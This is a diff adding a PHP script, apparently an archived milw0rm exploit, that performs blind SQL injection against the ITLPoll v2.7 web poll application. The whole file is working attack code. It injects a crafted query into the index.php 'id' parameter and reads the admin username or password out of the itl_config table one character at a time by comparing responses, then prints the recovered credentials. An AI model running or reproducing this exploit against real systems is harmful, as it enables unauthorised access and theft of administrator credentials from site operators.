@@ -1,0 +1,70 @@
+<?php
+
+function usage ()
+{
+    echo "\nITLPoll v2.7 Stable2 Blind SQL Injection Exploit".
+         "\n[☢] Usage   : ./itlpoll.php hostname path <username or password>".
+         "\n[☢] Ex	: ./itlpoll.php localhost /itlpoll password".
+	 "\n\n";
+    exit ();
+}
+
+
+function query ($func, $chr, $pos)
+{   //replace 1' with a valid poll number if you have problems. See hostname/path/?Archive for a list of polls.
+    $query = "1' AND ORD(MID((SELECT IFNULL(CAST({$func} AS CHAR(10000)), CHAR(32)) FROM itl_config WHERE id = 1),{$pos},1))='{$chr}";
+    $query = str_replace (" ", "%20", $query);
+    $query = str_replace ("'", "%27", $query);
+    return $query;
+}
+
+function exploit ($host, $path, $func, $pos, $chr)
+{
+    $chr = ord ($chr);
+    $fp = fsockopen ($host, 80);
+    $query = query ($func, $chr, $pos);
+    $request = "GET {$path}/index.php?id={$query} HTTP/1.1\r\n".
+           "Host: {$host}\r\n".
+           "Connection: Close\r\n\r\n";
+    
+    fputs ($fp, $request);
+    while (!feof ($fp))
+        $reply .= fgets ($fp, 1024);
+    
+    fclose ($fp);
+
+    if (preg_match ("/EXPIERED/", $reply))
+        return false;
+    else
+        return true;
+}
+
+
+if ($argc != 4)
+
+    usage ();
+
+$host = $argv [1];
+$path = $argv [2];
+$func = $argv [3];
+$key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; //add a bigger char set if you can't get the username
+$pos = 1;
+$chr = 0;
+
+echo "[☢] Creds: ";
+
+while ($pos <= 32)
+{
+    if (exploit ($host, $path, $func, $pos, $key [$chr]))
+    {
+        echo $key [$chr];
+        $chr = 0;
+        $pos++;
+    }
+    else
+        $chr++;
+}
+echo "\n";
+?>
+
+# milw0rm.com [2009-01-26]
